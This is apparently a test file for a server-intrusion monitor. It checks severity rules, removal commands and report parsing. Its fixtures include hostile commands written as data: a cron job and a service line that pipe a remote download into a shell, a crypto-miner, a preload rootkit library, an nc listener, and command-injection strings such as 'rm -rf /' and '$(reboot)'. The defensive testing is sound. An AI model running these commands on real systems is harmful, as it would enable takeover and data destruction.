// the server-watch rules on fixed inputs (no server needed):  cd apps/api && npx tsx <this file>
async function main() {
  const { reconcile, assess, howToRemove, parseReport } = await import(process.cwd() + "/src/services/hostwatch");
  let failed = 0;
  const pass = (ok: unknown, label: string, extra = "") => { if (!ok) failed++; console.log((ok ? "PASS  " : "FAIL  ") + label + (extra ? "  | " + extra : "")); };

  const it = (kind: string, key: string, label: string, detail: any, fp = "f1") => ({ kind, key, label, detail, fp });
  const user = (name: string, extra: any = {}) => it("user", "user:" + name, name, { uid: 1000, login: true, hasPassword: true, emptyPassword: false, passwordChanged: "2026-01-01", ...extra });
  const base = () => [
    user("root", { uid: 0 }), user("deploy"), user("daemon", { uid: 1, login: false, hasPassword: false }),
    it("admin", "admin:deploy:group sudo", "deploy", { user: "deploy", via: "member of the sudo group" }),
    it("ssh_key", "key:root:SHA256:aaa", "admin@laptop (root)", { user: "root", fingerprint: "SHA256:aaa", comment: "admin@laptop", file: "/root/.ssh/authorized_keys" }),
    it("sshd", "sshd:PasswordAuthentication", "PasswordAuthentication", { setting: "PasswordAuthentication", value: "no" }),
    it("sshd", "sshd:PermitRootLogin", "PermitRootLogin", { setting: "PermitRootLogin", value: "prohibit-password" }),
    it("cron", "cron:/etc/cron.d/backup:1", "backup.sh", { file: "/etc/cron.d/backup", user: "root", schedule: "0 3 * * *", command: "/usr/local/bin/backup.sh" }),
    it("unit", "unit:nginx.service", "nginx.service", { file: "/usr/lib/systemd/system/nginx.service", origin: "package", enabled: true, runs: "/usr/sbin/nginx" }),
    it("startup", "startup:/etc/rc.local", "/etc/rc.local", { file: "/etc/rc.local" }),
    it("port", "port:tcp:22", "tcp 22", { protocol: "tcp", port: 22, program: "sshd", public: true }),
    it("port", "port:tcp:3306", "tcp 3306", { protocol: "tcp", port: 3306, program: "mysqld", public: false }),
  ];
  const report = (items: any[]) => ({ version: 1, generatedAt: "2026-11-20T10:00:00Z", hostname: "srv", items });
  const asKnown = (items: any[], status = "accepted") => items.map((i) => ({ key: i.key, kind: i.kind, fingerprint: i.fp, status, present: true, detail: i.detail }));

  // first scan
  let c = reconcile([], report(base()));
  pass(c.insert.length === 12 && c.insert.every((r: any) => r.status === "initial") && !c.update.length && !c.gone.length, "the first scan is put up for review; nothing in it is an alarm");
  pass(c.insert.find((r: any) => r.key === "admin:deploy:group sudo").severity === "urgent", "risky things are still marked in the first review, so they stand out");

  // nothing changed
  c = reconcile(asKnown(base()), report(base()));
  pass(!c.insert.length && !c.update.length && !c.gone.length && !c.drop.length, "an unchanged server produces nothing");

  // what an intruder leaves
  const hit = [
    ...base().filter((i) => i.key !== "sshd:PasswordAuthentication" && i.key !== "port:tcp:3306"),
    user("support", { passwordChanged: "2026-11-20" }),
    it("admin", "admin:support:group sudo", "support", { user: "support", via: "member of the sudo group" }),
    it("ssh_key", "key:root:SHA256:evil", "x (root)", { user: "root", fingerprint: "SHA256:evil", comment: "x", file: "/root/.ssh/authorized_keys" }),
    it("ssh_key", "key:www:SHA256:evil", "x (www)", { user: "www", fingerprint: "SHA256:evil", comment: "x", file: "/var/www/.ssh/authorized_keys" }),
    it("sshd", "sshd:PasswordAuthentication", "PasswordAuthentication", { setting: "PasswordAuthentication", value: "yes" }, "f2"),
    it("cron", "cron:/var/spool/cron/crontabs/deploy:9", "curl", { file: "/var/spool/cron/crontabs/deploy", user: "deploy", schedule: "*/5 * * * *", command: "curl -s http://203.0.113.9/x.sh | sh" }),
    it("cron", "cron:/etc/cron.d/certs:2", "certbot", { file: "/etc/cron.d/certs", user: "root", schedule: "0 */12 * * *", command: "certbot -q renew" }),
    it("unit", "unit:kworkerd.service", "kworkerd.service", { file: "/etc/systemd/system/kworkerd.service", origin: "admin", enabled: true, runs: "/dev/shm/.x/kworkerd -o stratum+tcp://pool:3333" }),
    it("unit", "unit:redis.service", "redis.service", { file: "/usr/lib/systemd/system/redis.service", origin: "package", enabled: true, runs: "/usr/bin/redis-server" }),
    it("startup", "startup:/etc/ld.so.preload", "/etc/ld.so.preload", { file: "/etc/ld.so.preload", loads: ["/usr/local/lib/libhide.so"] }),
    it("port", "port:tcp:4444", "tcp 4444", { protocol: "tcp", port: 4444, program: "nc", public: true }),
    it("port", "port:tcp:6379", "tcp 6379", { protocol: "tcp", port: 6379, program: "redis-server", public: false }),
  ];
  c = reconcile(asKnown(base()), report(hit));
  const sev = (key: string) => c.insert.find((r: any) => r.key === key)?.severity;
  const why = (key: string) => c.insert.find((r: any) => r.key === key)?.reason ?? "";
  pass(c.insert.length === 11 && c.insert.every((r: any) => r.status === "new"), "everything that was not there before is a finding", String(c.insert.length));
  pass(sev("user:support") === "check" && sev("admin:support:group sudo") === "urgent", "a new account is to check; giving it admin rights is urgent");
  pass(sev("key:root:SHA256:evil") === "urgent" && sev("key:www:SHA256:evil") === "check" && why("key:root:SHA256:evil").includes("without a password"), "a new key on root is urgent, on an ordinary user to check, and says why", why("key:root:SHA256:evil"));
  pass(sev("cron:/var/spool/cron/crontabs/deploy:9") === "urgent" && why("cron:/var/spool/cron/crontabs/deploy:9").includes("downloads") && sev("cron:/etc/cron.d/certs:2") === "check", "a job that downloads and runs is urgent; an ordinary new job is to check");
  pass(sev("unit:kworkerd.service") === "urgent" && sev("unit:redis.service") === "note", "a service running from a temporary folder is urgent; one from a package is a note");
  pass(sev("startup:/etc/ld.so.preload") === "urgent" && sev("port:tcp:4444") === "check" && sev("port:tcp:6379") === "note", "a preload library is urgent; a port open to the outside is to check; a local one is a note");
  const pw = c.update.find((u: any) => u.key === "sshd:PasswordAuthentication");
  pass(pw?.set.status === "changed" && pw.set.severity === "urgent" && pw.set.previous.value === "no", "SSH accepting passwords again is an urgent change, and the old value is kept");
  pass(c.gone.join() === "port:tcp:3306" && !c.drop.length, "something accepted that disappeared is remembered as gone, not deleted");

  // changes to accepted things
  const changed = (key: string, detail: any) => reconcile(asKnown(base()), report(base().map((i) => (i.key === key ? { ...i, fp: "f2", detail: { ...i.detail, ...detail } } : i)))).update[0]?.set;
  pass(changed("user:deploy", { passwordChanged: "2026-11-20" })?.reason.includes("password of deploy was changed"), "a changed password is reported as that");
  pass(changed("user:daemon", { login: true })?.severity === "urgent", "a system account that can suddenly sign in is urgent");
  pass(changed("user:deploy", { uid: 0 })?.severity === "urgent" && changed("user:deploy", { emptyPassword: true })?.severity === "urgent", "user id 0 or an empty password is urgent");
  pass(changed("port:tcp:22", { program: "dropbear" })?.reason.includes("before: sshd"), "a port taken over by another program names both");
  pass(changed("unit:nginx.service", { runs: "/bin/sh -c 'curl http://x/y | bash'" })?.severity === "urgent", "a package service edited to download and run is urgent, not a note");

  // states
  const k = asKnown(base());
  k.find((x) => x.key === "port:tcp:3306")!.present = false;
  c = reconcile(k, report(base()));
  pass(c.update.length === 1 && c.update[0].set.present === true && !c.update[0].set.status && !c.insert.length, "something accepted that comes back unchanged is quiet");
  c = reconcile(asKnown(base(), "initial"), report(base().slice(1).map((i) => (i.key === "user:deploy" ? { ...i, fp: "f9" } : i))));
  pass(c.drop.join() === "user:root" && c.update.length === 1 && !c.update[0].set.status, "before the first review, changes just update the list");
  c = reconcile(asKnown(base()), report(base().filter((i) => i.kind !== "port")));
  pass(!c.gone.length, "a scan that could not read ports at all does not report every port as gone");
  c = reconcile(asKnown(base()), report([...base(), it("unit", "unit:dbbkp-scan.timer", "dbbkp-scan.timer", { origin: "admin", enabled: true })]));
  pass(c.insert[0]?.status === "accepted", "the platform's own scan timer is accepted without asking");
  c = reconcile(asKnown(base()), report([...base(), ...base()]));
  pass(!c.insert.length && !c.update.length, "the same item twice in a report counts once");

  // removing by hand
  const rm = (i: any, previous?: any) => howToRemove({ ...i, previous });
  pass(rm(user("support")).command === "sudo usermod -L -s /usr/sbin/nologin support && sudo pkill -KILL -u support", "removing a user means locking it and ending its sessions");
  pass(rm(it("admin", "admin:support:group sudo", "support", { user: "support" })).command?.startsWith("sudo gpasswd -d support sudo"), "admin rights by group: the exact command");
  pass(rm(hit.find((i) => i.key === "unit:kworkerd.service")).command?.includes("systemctl disable --now kworkerd.service") && rm(hit.find((i) => i.key === "port:tcp:4444")).command?.includes("ufw deny 4444/tcp"), "a service is stopped and moved aside; a port can be blocked at once");
  pass(rm(base()[5], { value: "no" }).text.includes('back to "no"'), "an SSH setting says what to set it back to");
  pass(rm(user("x; rm -rf /")).command === undefined && rm(it("unit", "unit:a b", "a$(reboot).service", { file: "/etc/systemd/system/a.service", origin: "admin" })).command === undefined, "a name that is not plain text never ends up in a command to copy");

  // the report file is input like any other
  const good = JSON.stringify(report(base()));
  pass(parseReport(good).items.length === 12, "a good report is read");
  let threw = 0;
  for (const bad of ["{}", "[]", JSON.stringify({ version: 2, generatedAt: "2026-11-20T10:00:00Z", items: [] }), JSON.stringify({ version: 1, generatedAt: "soon", items: [] }), "not json"]) { try { parseReport(bad); } catch { threw++; } }
  pass(threw === 5, "anything that is not a version 1 report is refused");
  const messy = parseReport(JSON.stringify(report([...base(), { kind: "nonsense", key: "x", fp: "1" }, { kind: "user", key: "", fp: "1" }, null, { kind: "user", key: "user:ok", fp: "1" }])));
  pass(messy.items.length === 13 && messy.items[12].label === "user:ok", "items it does not understand are skipped, the rest is kept");

  // running programs, connections, containers
  const SITE = "aaaaaaaa-0000-4000-8000-000000000001";
  const proc = (exe: string, signs: string[], extra: any = {}) => it("process", (signs[0] === "cpu" ? "cpu:" : "proc:") + exe, exe.split("/").pop()!, { exe, signs, pids: [4242, 4243], count: 2, user: "deploy", command: exe, container: null, ...extra });
  const ctr = (key: string, d: any) => it("container", key, d.name, { image: "alpine", running: true, runtime: "docker", privileged: false, hostPid: false, hostNetwork: false, riskyMounts: [], ...d });
  const live = [
    proc("/tmp/.x/kworkerd", ["temp"]), proc("/opt/xm/xmrig", ["miner"]), proc("/usr/bin/perl", ["fake-kernel"], { command: "[kworker/0:2]" }), proc("/root/.x/bot", ["deleted"]),
    proc("/home/deploy/.cache/sync", ["hidden"]), proc("/usr/bin/ffmpeg", ["cpu"], { cpuPct: 92, minutes: 5 }), proc("/usr/sbin/nginx", ["old-copy"]),
    proc("/usr/local/bin/node", ["temp"], { container: "abababababab" }),
    it("outbound", "out:198.51.100.7:3333", "198.51.100.7:3333", { remote: "198.51.100.7", port: 3333, program: "kworkerd", pid: 4242, kind: "pool" }),
    it("outbound", "out:203.0.113.20:6667", "203.0.113.20:6667", { remote: "203.0.113.20", port: 6667, program: "perl", pid: 4300, kind: "chat" }),
    it("outbound", "out:198.51.100.9:8888", "198.51.100.9:8888", { remote: "198.51.100.9", port: 8888, program: "java", pid: 900, kind: "maybe-pool" }),
    ctr("container:helper", { name: "helper", privileged: true, hostPid: true, riskyMounts: ["/"] }),
    ctr("container:blog", { name: "blog", image: "ghost:5" }),
    ctr("container:app:" + SITE, { name: "dbbkp-site-aaaaaaaa-11112222", site: SITE }),
    ctr("container:app:bbbbbbbb-0000-4000-8000-000000000009", { name: "dbbkp-site-bbbbbbbb-1", site: "bbbbbbbb-0000-4000-8000-000000000009" }),
    ctr("container:dbbkp-api", { name: "dbbkp-api", riskyMounts: ["/var/run/docker.sock"] }),
  ];
  const scanned = ["user", "admin", "ssh_key", "sshd", "cron", "unit", "startup", "port", "process", "outbound", "container"];
  c = reconcile(asKnown(base()), { ...report([...base(), ...live]), scanned }, { siteIds: new Set([SITE]) });
  const lv = (key: string) => c.insert.find((r: any) => r.key === key);
  pass(["proc:/tmp/.x/kworkerd", "proc:/opt/xm/xmrig", "proc:/usr/bin/perl", "proc:/root/.x/bot"].every((k) => lv(k)?.severity === "urgent"), "a miner, a program in a temporary folder, a fake kernel thread and a self-deleted program are urgent");
  pass(lv("proc:/tmp/.x/kworkerd").reason.includes("2 copies") && lv("proc:/usr/local/bin/node").reason.includes("inside container abababababab"), "the reason says how many copies, and which container");
  pass(lv("proc:/home/deploy/.cache/sync").severity === "check" && lv("cpu:/usr/bin/ffmpeg").severity === "check" && lv("cpu:/usr/bin/ffmpeg").reason.includes("92%") && lv("proc:/usr/sbin/nginx").severity === "note", "a hidden folder or a busy core is to check; an old copy after an update is a note");
  pass(lv("out:198.51.100.7:3333").severity === "urgent" && lv("out:203.0.113.20:6667").severity === "urgent" && lv("out:198.51.100.9:8888").severity === "check", "a mining-pool or chat-control connection is urgent; a port pools only sometimes use is to check");
  pass(lv("container:helper").severity === "urgent" && lv("container:helper").reason.includes("full access") && lv("container:blog").severity === "check", "a container with full access to the server is urgent; any other unknown container is to check");
  pass(lv("container:app:" + SITE).status === "accepted" && lv("container:dbbkp-api").status === "accepted", "the panel's own app and core containers are accepted without asking");
  pass(lv("container:app:bbbbbbbb-0000-4000-8000-000000000009").status === "new", "a container carrying the label of an app that does not exist is not trusted");
  const ownRisky = reconcile(asKnown(base()), report([...base(), ctr("container:app:" + SITE, { name: "x", site: SITE, privileged: true })]), { siteIds: new Set([SITE]) }).insert[0];
  pass(ownRisky.status === "new" && ownRisky.severity === "urgent", "nor an app container that was given full access");
  // a program stops: gone, because processes were scanned; no processes at all is not "not scanned"
  const knownLive = asKnown([...base(), ...live]);
  c = reconcile(knownLive, { ...report(base()), scanned });
  pass(c.gone.length === live.length, "when nothing suspicious runs any more, every earlier program, connection and container is marked gone", String(c.gone.length));
  c = reconcile(knownLive, { ...report(base()), scanned: scanned.filter((k) => k !== "container") });
  pass(c.gone.length === live.filter((i) => i.kind !== "container").length, "containers that could not be read this time are not marked gone");
  // removing
  pass(rm(live[0]).command === "sudo kill -STOP 4242 4243 ; sudo cp /proc/4242/exe /root/evidence-kworkerd-4242 ; sudo kill -KILL 4242 4243", "a program: freeze, keep a copy, stop", rm(live[0]).command);
  pass(rm(live[7]).command === "sudo docker stop abababababab" && rm(live[6]).command === undefined, "inside a container: stop the container; an old copy: restart, no kill");
  pass(rm(live[8]).command === "sudo ufw deny out to 198.51.100.7 ; sudo kill -KILL 4242" && rm(live[11]).command === "sudo docker update --restart=no helper ; sudo docker stop helper", "a connection is blocked; a container is kept from restarting and stopped");
  pass(rm(it("outbound", "out:x", "x", { remote: "1.2.3.4; reboot", port: 3333, pid: 1 })).command === undefined && rm(proc("/tmp/a", ["temp"], { pids: [1, "2; reboot"] })).command === undefined, "addresses and process numbers that are not plain never end up in a command");
  pass(parseReport(JSON.stringify({ ...report(base()), scanned: ["user", "nonsense", "process"] })).scanned?.join() === "user,process", "the list of scanned kinds is read, unknown names dropped");

  console.log(failed ? `${failed} FAILED` : "server watch rules hold");
  process.exit(failed ? 1 : 0);
}
main().catch((e) => { console.error("CRASH", e); process.exit(1); });
